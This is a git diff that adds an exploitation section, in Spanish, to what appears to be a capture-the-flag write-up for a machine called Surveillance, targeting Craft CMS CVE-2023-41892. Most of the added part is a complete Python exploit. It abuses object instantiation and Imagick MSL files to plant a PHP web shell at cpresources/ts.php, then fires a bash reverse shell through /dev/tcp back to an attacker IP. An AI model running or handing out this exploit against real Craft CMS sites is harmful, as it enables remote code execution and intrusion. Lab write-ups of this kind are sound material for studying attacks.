@@ -126,4 +126,132 @@ Luego voy a la Web a ver qué contiene esta ruta y me redirige a **/admin/login*
 ![Web]({{ 'assets/img/commons/Surveillance/cms.png' | relative_url }}){: .center-image }
 _Craft CMS Login_
 
+Luego buscando "Craft CMS vulnerabilities" y en el primer resultado de la búsqueda, veo que está el **CVE-2023-41892** con un **CVSS** crítico
 
+
+![Web]({{ 'assets/img/commons/Surveillance/cve.png' | relative_url }}){: .center-image }
+_Craft CMS CVE_
+
+## Explotación
+
+Luego buscando por el CVE correspondiente encontré un [POC](https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce) el cual contiene un script en Python para la explotación de la vulnerabilidad, sin embargo, yo realicé algunas modificaciones.
+
+Pero antes de continuar con el script, voy a explicar a manera de como entendí cómo sucede todo por detrás, porque soy un curioso y la curiosidad mato al...
+
+Primeramente, dentro del POC hay un [link](https://blog.calif.io/p/craftcms-rce) donde se nos explica la vulnerabilidad un poco más en detalle. Para resumir todo, básicamente lo que se hace por detrás es que se puede crear un **Objeto** gracias a los distintos métodos que hay corriendo. Dentro de esos métodos hay uno el cual es **\yii\rbac\PhpManager::loadFromFile** que lo que hace es cargar datos desde un archivo, el archivo que indicaremos en el script.
+
+Luego tenemos en el código base de **Craft CMS** una clase **\GuzzleHttp\Psr7\FnStream** que lo que hace es destruir el objeto y hace una limpieza en la memoria, esto nos sirve para poder cargar el **phpinfo** al realizar una nueva instancia de dicha clase.
+
+Una vez entendido esto y que podemos crear objetos a nuestro gusto, está la ocurrencia en la extensión **Imagick**, la cual posteriormente será un objeto. En este [link](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) se nos explica cómo funciona todo.
+
+Ahora abusaremos de la extensión **Imagick** de PHP, donde dicha extensión acepta como parámetro **files** y a este parámetro se le podrán pasar rutas de alguna imágen, una url, o incluso wildcards. (Véase [Imagick Constructor](https://www.php.net/manual/es/imagick.construct.php)).
+
+**Imagick** admite el formato MSL, a través y gracias a dicho formato es que lograremos explotar la vulnerabilidad. A través de este formato seremos capaces de leer o mejor dicho, php será capaz de interpretar un archivo MSL en una ruta donde se le indique.
+
+Una vez comprendido esto, lo que haremos será crear el archivo MSL con formato XML ya que así viene el formato MSL y a través del esquema VID de **Imagick** y con wildcards podemos llegar a saber el nombre del archivo el cual se sube en la máquina víctima, ya que el archivo se sube en la ruta temporal por defecto gracias a que generamos un error por HTTP, solamente que dicho archivo tendrá un nombre que inicia por  **php** y lo que le siga de manera aleatoria. A través del esquema VID lo que se conseguirá no es sólo el nombre del archivo sino que también jugando junto a **MSL** podremos hacer que se ejecute el archivo subido. Una vez entendido todo (O espero que así haya sido) podemos ver el scritp.
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+import requests
+import re
+from termcolor import colored
+import time
+
+proxy = {'http':'http://127.0.0.1:8080'}
+
+headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"}
+
+def get_target():
+
+    parser = argparse.ArgumentParser(description="Exploit for CVE-2023-41892")
+
+    parser.add_argument("-t", "--target", required=True, dest="target", help="exploit.py -t <ip target or domain>")
+    parser.add_argument("-l", "--listen", required=True, dest="listen", help="exploit.py -t -i <your attacker ip>")
+    parser.add_argument("-p", "--port", required=True, dest="port", help="exploit.py -t -i <your attacker port of listening>")
+
+    args = parser.parse_args()
+    return args.target, args.listen, args.port
+
+
+def get_route_web(): #Obtenemos la ruta donde se almacena la página web
+
+
+    data = { "action": "conditions/render",
+            "testConfigObject":"craft\elements\conditions\ElementCondition",
+            "config": r'{"name":"testConfigObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}' }
+
+
+
+    r = requests.post(target, headers=headers, data=data, proxies=proxy)
+
+
+    route_web = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td></tr>'
+
+    match = re.search(route_web, r.text, re.DOTALL)
+
+    return match.group(1)
+
+
+def write_payload(web_route): #Enviamos un archivo en formato MSL cuya estructura será una imágen y en XML, antes de realizar el envío cargamos a través de la extensión Imagick y con formato MSL el /etc/hosts para que la solicitud HTTP falle, lo que hará que el archivo que enviamos se cargue en la ruta /tmp
+
+    print(colored("\n[*] Enviando archivo de imagen...", 'green'))
+
+    data = { "action": "conditions/render",
+            "testConfigObject":"craft\elements\conditions\ElementCondition",
+            "config": r'{"name":"testConfigObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/hosts"}}}'      }
+
+    image_file = {
+
+        "image": ("pwned.msl", f"""<?xml version="1.0" encoding="UTF8"?>
+        <image>
+        <read filename="caption:&lt;?php @system(@$_REQUEST['ts']); ?&gt;"/>
+        <write filename="info:{web_route}/cpresources/ts.php"/>
+        </image>""", "text/plain")
+    }
+
+    r = requests.post(target, headers=headers, data=data, files=image_file)
+
+
+def execute_msl(): #Ejecutamos a través del esquema vid y formato msl para buscar el nombre del archivo mediante wildcards y con la extensión imagick
+
+    print(colored("\n[*] Obteniendo nombre del archivo...\n", 'green'))
+
+    data = {
+        "action": "conditions/render",
+        "configObject[class]": "craft\elements\conditions\ElementCondition",
+        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + "/tmp" + r'/php*"}}}'
+    }
+
+    r = requests.post(target, headers=headers, data=data)
+
+
+
+def get_shell(your_ip, port): #Enviamos la shell hacia el puerto indicado por el usuario
+
+    print(colored(f"[*] Ponte en escucha por el puerto {port}", 'green'))
+
+    time.sleep(2)
+
+    execute_shell = f'bash -c "bash -i >& /dev/tcp/{your_ip}/{port} 0>&1"'
+
+    params = {"ts": execute_shell}
+
+    r = requests.get(target + "/cpresources/ts.php" , headers=headers, params=params)
+
+
+def main():
+
+    global target
+    target, your_ip, port = get_target()
+    target = "http://" + target
+    web_route = get_route_web()
+    write_payload(web_route)
+    execute_msl()
+    get_shell(your_ip, port)
+
+if __name__=='__main__':
+
+    main()
+```
